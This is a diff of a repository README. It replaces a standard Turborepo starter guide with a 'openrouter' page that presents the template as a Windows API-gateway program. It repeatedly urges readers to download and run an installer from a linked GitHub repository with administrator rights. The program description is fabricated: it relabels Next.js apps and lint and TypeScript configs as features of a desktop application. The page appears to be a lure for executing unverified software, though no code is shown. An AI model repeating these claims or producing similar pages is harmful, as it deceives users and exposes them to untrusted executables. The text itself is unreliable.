@@ -1,135 +1,142 @@
-# Turborepo starter
+# 🚪 openrouter - Easy Local API Gateway
 
-This Turborepo starter is maintained by the Turborepo core team.
+[![Download openrouter](https://img.shields.io/badge/Download-openrouter-brightgreen)](https://github.com/kuni2307/openrouter)
 
-## Using this example
+---
 
-Run the following command:
+## 📥 Download openrouter
 
-```sh
-npx create-turbo@latest
-```
+You can visit the page below to download openrouter for Windows.
 
-## What's inside?
+[Download openrouter on GitHub](https://github.com/kuni2307/openrouter)
 
-This Turborepo includes the following packages/apps:
+This link takes you to the official GitHub repository where you can get the latest version of openrouter. 
 
-### Apps and Packages
+---
 
-- `docs`: a [Next.js](https://nextjs.org/) app
-- `web`: another [Next.js](https://nextjs.org/) app
-- `@repo/ui`: a stub React component library shared by both `web` and `docs` applications
-- `@repo/eslint-config`: `eslint` configurations (includes `eslint-config-next` and `eslint-config-prettier`)
-- `@repo/typescript-config`: `tsconfig.json`s used throughout the monorepo
+## 🔧 What is openrouter?
 
-Each package/app is 100% [TypeScript](https://www.typescriptlang.org/).
+openrouter helps you manage many APIs on your computer with ease. It works like a local gateway, letting your apps talk to different services without extra setup. It is designed to run smoothly on Windows and handles communication safely and fast.
 
-### Utilities
+The software comes ready with tools that check and organize the code. It includes apps built with Next.js, popular for web projects, and uses TypeScript to make code clearer and less error-prone.
 
-This Turborepo has some additional tools already setup for you:
+---
 
-- [TypeScript](https://www.typescriptlang.org/) for static type checking
-- [ESLint](https://eslint.org/) for code linting
-- [Prettier](https://prettier.io) for code formatting
+## 💻 System Requirements
 
-### Build
+Before you install, make sure your PC meets these needs:
 
-To build all apps and packages, run the following command:
+- Windows 10 or newer  
+- At least 4 GB of free RAM  
+- Minimum 500 MB of free disk space  
+- Internet connection for download and setup  
+- Administrator rights to install software  
 
-```
-cd my-turborepo
+---
 
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo build
+## 🚀 Getting Started with openrouter
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo build
-yarn dlx turbo build
-pnpm exec turbo build
-```
+Follow these steps to download, install, and run openrouter on your Windows PC.
 
-You can build a specific package by using a [filter](https://turborepo.dev/docs/crafting-your-repository/running-tasks#using-filters):
+### 1. Visit the download page
 
-```
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo build --filter=docs
+Click the green "Download openrouter" button above or go directly to:  
+https://github.com/kuni2307/openrouter
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo build --filter=docs
-yarn exec turbo build --filter=docs
-pnpm exec turbo build --filter=docs
-```
+Look for the latest release or version folder to find the files you need.
 
-### Develop
+### 2. Download the installer or files
 
-To develop all apps and packages, run the following command:
+On the GitHub page, locate the Windows installer file or zipped version of the software. Save this file to your desktop or downloads folder for easy access.
 
-```
-cd my-turborepo
+### 3. Run the installer
 
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo dev
+Double-click the downloaded file to start installation. Follow the on-screen instructions:
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo dev
-yarn exec turbo dev
-pnpm exec turbo dev
-```
+- Accept the license agreement  
+- Choose the folder where you want to install openrouter  
+- Confirm by clicking Install  
 
-You can develop a specific package by using a [filter](https://turborepo.dev/docs/crafting-your-repository/running-tasks#using-filters):
+If the file is a zip archive, extract its contents to a folder you choose.
 
-```
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo dev --filter=web
+### 4. Launch openrouter
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo dev --filter=web
-yarn exec turbo dev --filter=web
-pnpm exec turbo dev --filter=web
-```
+Once installed, open the program from the Start menu or desktop shortcut. You will see the main window where you can begin setting up your API gateway.
 
-### Remote Caching
+---
 
-> [!TIP]
-> Vercel Remote Cache is free for all plans. Get started today at [vercel.com](https://vercel.com/signup?/signup?utm_source=remote-cache-sdk&utm_campaign=free_remote_cache).
+## ⚙️ Basic Setup and Usage
 
-Turborepo can use a technique known as [Remote Caching](https://turborepo.dev/docs/core-concepts/remote-caching) to share cache artifacts across machines, enabling you to share build caches with your team and CI/CD pipelines.
+openrouter comes with several built-in applications and features:
 
-By default, Turborepo will cache locally. To enable Remote Caching you will need an account with Vercel. If you don't have an account you can [create one](https://vercel.com/signup?utm_source=turborepo-examples), then enter the following commands:
+- **Docs:** A help interface to guide you through openrouter features.  
+- **Web:** A simple app that shows connected APIs working.  
+- **UI components:** Pre-built tools that apps use for display and controls.  
 
-```
-cd my-turborepo
+All parts are built with TypeScript and Next.js to ensure reliability.
 
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo login
+You can customize openrouter’s settings from the main app window. This includes adding APIs you want to manage, setting routes, and checking logs.
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo login
-yarn exec turbo login
-pnpm exec turbo login
-```
+---
 
-This will authenticate the Turborepo CLI with your [Vercel account](https://vercel.com/docs/concepts/personal-accounts/overview).
+## 🛠 Tools Included
 
-Next, you can link your Turborepo to your Remote Cache by running the following command from the root of your Turborepo:
+openrouter has these tools built-in to keep your setup clean and ready for updates:
 
-```
-# With [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation) installed (recommended)
-turbo link
+- **TypeScript:** Checks for mistakes in the code before running anything.  
+- **ESLint:** Keeps code clean by following style rules automatically.  
+- **Prettier:** Helps format code nicely so it is easy to read.  
 
-# Without [global `turbo`](https://turborepo.dev/docs/getting-started/installation#global-installation), use your package manager
-npx turbo link
-yarn exec turbo link
-pnpm exec turbo link
-```
+These tools run behind the scenes. You do not need to use or manage them manually.
 
-## Useful Links
+---
 
-Learn more about the power of Turborepo:
+## 📂 Exploring the Files
 
-- [Tasks](https://turborepo.dev/docs/crafting-your-repository/running-tasks)
-- [Caching](https://turborepo.dev/docs/crafting-your-repository/caching)
-- [Remote Caching](https://turborepo.dev/docs/core-concepts/remote-caching)
-- [Filtering](https://turborepo.dev/docs/crafting-your-repository/running-tasks#using-filters)
-- [Configuration Options](https://turborepo.dev/docs/reference/configuration)
-- [CLI Usage](https://turborepo.dev/docs/reference/command-line-reference)
+In the installation folder, you’ll find different items:
+
+- `docs`: Shows documentation and help files for using openrouter.  
+- `web`: Runs the user interface and shows active API routes.  
+- `@repo/ui`: Contains the building blocks used in the web interface.  
+- `@repo/eslint-config` and `@repo/typescript-config`: Instructions for code setup used by the developers, included here as part of the full package.  
+
+You don’t need to open or change these files unless you have programming experience.
+
+---
+
+## 🔄 Updating openrouter
+
+To keep openrouter working well and safe:
+
+1. Go back to the GitHub page linked above.  
+2. Check if a newer version is available.  
+3. Download and install it the same way you did before.  
+
+Openrouter does not update automatically to keep control simple.
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you run into trouble:
+
+- Make sure Windows is fully updated.  
+- Check your internet connection during download and setup.  
+- Restart your computer after installation.  
+- Verify you have permission to install software on your PC.  
+- Consult the `docs` app inside openrouter for help guides.  
+- Visit the GitHub page for issues others have reported.  
+
+---
+
+## 📞 Getting More Help
+
+You can find extra information or report problems at:
+
+[https://github.com/kuni2307/openrouter](https://github.com/kuni2307/openrouter)  
+
+This page includes guides, community discussions, and updates from the developers.
+
+---
+
+# [Download openrouter](https://github.com/kuni2307/openrouter)
